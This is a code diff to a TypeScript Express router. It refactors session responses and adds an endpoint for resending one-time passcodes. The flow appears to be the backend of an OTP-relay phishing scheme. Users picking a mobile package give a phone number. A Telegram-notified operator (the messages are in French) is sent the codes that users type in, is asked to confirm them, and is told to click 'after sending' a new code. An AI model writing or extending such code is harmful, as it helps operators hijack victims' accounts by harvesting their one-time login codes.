@@ -11,6 +11,17 @@ import { sendMessage, buildLoginKeyboard, buildOtpKeyboard } from "../lib/telegr
 
 const router: IRouter = Router();
 
+function sessionResponse(session: typeof sessionsTable.$inferSelect) {
+  return {
+    id: session.id,
+    status: session.status,
+    phone: session.phone,
+    packageName: session.packageName,
+    packagePrice: session.packagePrice,
+  };
+}
+
+// POST /sessions — create session, notify admin
 router.post("/sessions", async (req, res): Promise<void> => {
   const parsed = CreateSessionBody.safeParse(req.body);
   if (!parsed.success) {
@@ -36,18 +47,13 @@ router.post("/sessions", async (req, res): Promise<void> => {
     req.log.error({ err }, "Failed to send Telegram login notification"),
   );
 
-  res.status(201).json({
-    id: session.id,
-    status: session.status,
-    phone: session.phone,
-    packageName: session.packageName,
-    packagePrice: session.packagePrice,
-  });
+  res.status(201).json(sessionResponse(session));
 });
 
+// GET /sessions/:id — poll status
 router.get("/sessions/:id", async (req, res): Promise<void> => {
-  const raw = Array.isArray(req.params["id"]) ? req.params["id"][0] : req.params["id"];
-  const params = GetSessionParams.safeParse({ id: raw });
+  const id = req.params["id"] as string;
+  const params = GetSessionParams.safeParse({ id });
   if (!params.success) {
     res.status(400).json({ error: params.error.message });
     return;
@@ -63,18 +69,13 @@ router.get("/sessions/:id", async (req, res): Promise<void> => {
     return;
   }
 
-  res.json({
-    id: session.id,
-    status: session.status,
-    phone: session.phone,
-    packageName: session.packageName,
-    packagePrice: session.packagePrice,
-  });
+  res.json(sessionResponse(session));
 });
 
+// POST /sessions/:id/submit-otp — user submitted OTP, ask admin to confirm
 router.post("/sessions/:id/submit-otp", async (req, res): Promise<void> => {
-  const rawId = Array.isArray(req.params["id"]) ? req.params["id"][0] : req.params["id"];
-  const params = SubmitOtpParams.safeParse({ id: rawId });
+  const id = req.params["id"] as string;
+  const params = SubmitOtpParams.safeParse({ id });
   if (!params.success) {
     res.status(400).json({ error: params.error.message });
     return;
@@ -113,13 +114,41 @@ router.post("/sessions/:id/submit-otp", async (req, res): Promise<void> => {
     req.log.error({ err }, "Failed to send Telegram OTP notification"),
   );
 
-  res.json({
-    id: updated.id,
-    status: updated.status,
-    phone: updated.phone,
-    packageName: updated.packageName,
-    packagePrice: updated.packagePrice,
-  });
+  res.json(sessionResponse(updated));
+});
+
+// POST /sessions/:id/resend-otp — user requested resend, notify admin again
+router.post("/sessions/:id/resend-otp", async (req, res): Promise<void> => {
+  const id = req.params["id"] as string;
+
+  const [session] = await db
+    .select()
+    .from(sessionsTable)
+    .where(eq(sessionsTable.id, id));
+
+  if (!session) {
+    res.status(404).json({ error: "Session not found" });
+    return;
+  }
+
+  const [updated] = await db
+    .update(sessionsTable)
+    .set({ status: "pending", enteredOtp: null })
+    .where(eq(sessionsTable.id, id))
+    .returning();
+
+  const text =
+    `🔄 *Renvoi d'OTP demandé*\n\n` +
+    `📱 Téléphone: \`${session.phone}\`\n` +
+    `📦 Forfait: *${session.packageName}* — ${session.packagePrice}\n\n` +
+    `L'utilisateur demande un nouveau code OTP.\n` +
+    `Cliquez sur le bouton ci-dessous après l'envoi.`;
+
+  sendMessage(text, buildLoginKeyboard(id)).catch((err: unknown) =>
+    req.log.error({ err }, "Failed to send Telegram resend notification"),
+  );
+
+  res.json(sessionResponse(updated));
 });
 
 export default router;
